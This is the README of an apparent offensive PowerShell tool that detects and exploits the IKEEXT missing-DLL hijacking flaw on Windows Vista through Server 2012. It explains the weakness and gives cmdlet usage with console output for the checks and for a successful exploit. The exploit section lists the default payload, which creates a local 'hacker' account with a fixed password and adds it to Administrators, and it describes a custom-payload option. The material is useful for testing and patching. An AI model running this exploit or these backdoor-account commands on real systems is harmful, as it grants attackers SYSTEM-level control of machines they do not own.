# IKEEXT DLL Hijacking Exploit Tool

This tool is intended for automatically detect and exploit the IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) Missing DLL vulnerability. 

## Description 

A major weakness is present in Windows Vista, 7, 8, Server 2008, Server 2008 R2 and Server 2012, which allows any authenticated user to gain system privileges under certain circumstances. 

In Windows there is a service called IKEEXT (IKE and AuthIP IPsec Keyring Modules), which runs as SYSTEM and tries to load a DLL that doesn't exist. The default DLL search order of Windows includes several system directories and ends by searching into PATH folders. To put it simple, if one of these folders is configured with weak permissions, any authenticated user can plant a malicious DLL to execute code as SYSTEM and thus elevate his/her privileges. 

IKEEXT trying to load 'wlbsctrl.dll':

![Procmon_DLL_Search_Order](https://github.com/itm4n/Ikeext-Privesc/raw/master/screenshots/01_procmon-dll-search-order.png)



## Usage 

This PowerShell script consists of 2 Cmdlets: 
* __Invoke-IkeextCheck__ - Only checks whether the machine is vulnerable. 
* __Invoke-IkeextExploit__ - If the machine is vulnerable, exploit it by dropping a specifically crafted DLL to the first weak folder.

### Detection

Syntax:
```
Invoke-IkeextCheck [-Verbose] 
```

Example: 
```
PS C:\Temp> . .\Ikeext-Privesc.ps1
PS C:\Temp> Invoke-IkeextCheck 
+----------------------------------------------------------+
|                IKEEXT DLL Hijacking Check                |
+----------------------------------------------------------+
[+] Microsoft Windows 7 Professionnel  is vulnerable.
[+] IKEEXT is enabled.
[+] Found 2 PATH folder(s) with weak permissions.
[+] |__ Found: 'C:\Python27\'
[+] |__ Found: 'C:\Python27\Scripts'
[+] 'wlbsctrl.dll' was not found on the system.
[+] Result: VULNERABLE
```

### Exploit 

Syntax:
```
Invoke-IkeextExploit [-Verbose] [-Force] [[-Payload] <String>]
```

This Cmdlet embeds a specifically crafted DLL (32 & 64 bits), that starts a new CMD process. This CMD process executes a BATCH file located in the same folder. The default payload will create a new user and add it to the local administrators group (the name of the group is automatically retrieved by the script). However, a custom payload can also be specified using the parameter ___-Payload___. 
Default commands: 
```
net user hacker SuperP@ss123 /ADD
net localgroup Administrators hacker /ADD
```

Example:
```
PS C:\temp> . .\Ikeext-Privesc.ps1
PS C:\temp> Invoke-IkeextExploit
+----------------------------------------------------------+
|                IKEEXT DLL Hijacking Check                |
+----------------------------------------------------------+
[+] Microsoft Windows 7 Professionnel  is vulnerable.
[+] IKEEXT is enabled.
[+] Found 2 PATH folder(s) with weak permissions.
[+] |__ Found: 'C:\Python27\'
[+] |__ Found: 'C:\Python27\Scripts'
[+] 'wlbsctrl.dll' was not found on the system.
[+] Result: VULNERABLE

+----------------------------------------------------------+
|               IKEEXT DLL Hijacking Exploit               |
+----------------------------------------------------------+
[*] Preparing exploit files...
[*] Trying to trigger the exploit (max 30s).
[*] Found log file: "C:\Python27\\wlbsctrl_baqboudj.txt".
[+] Exploit successful!
[*] Waiting for IKEEXT to be stopped (max 30s).
[+] IKEEXT was stopped.
[*] Performing cleanup.
```

## Credits 

High-Tech Bridge - Frédéric Bourla, who initially disovered the vulnerability and disclosed it on October 9, 2012. - https://www.htbridge.com/advisory/HTB23108 

